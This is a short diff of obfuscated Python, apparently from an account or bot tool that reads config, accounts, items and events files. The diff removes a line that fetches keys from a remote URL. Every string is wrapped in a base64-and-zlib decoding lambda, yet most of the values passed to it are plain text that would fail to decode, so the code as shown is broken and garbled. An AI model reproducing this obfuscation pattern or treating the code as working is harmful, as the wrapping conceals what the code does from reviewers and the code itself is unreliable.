@@ -35,7 +35,6 @@ P=(lambda s:B.decompress(C.b64decode(s)).decode())('config.json')
 r=(lambda s:B.decompress(C.b64decode(s)).decode())('accounts.txt')
 a=(lambda s:B.decompress(C.b64decode(s)).decode())('items.json')
 R=(lambda s:B.decompress(C.b64decode(s)).decode())('events.json')
-s=(lambda s:B.decompress(C.b64decode(s)).decode())('https://api-bot.online/api/v3/keys.txt')
 def N():
 	if k.system()==(lambda s:B.decompress(C.b64decode(s)).decode())('Windows'):J.system((lambda s:B.decompress(C.b64decode(s)).decode())('cls'))
 	else:J.system((lambda s:B.decompress(C.b64decode(s)).decode())('eJxLzklNLAIABgcCCA=='))
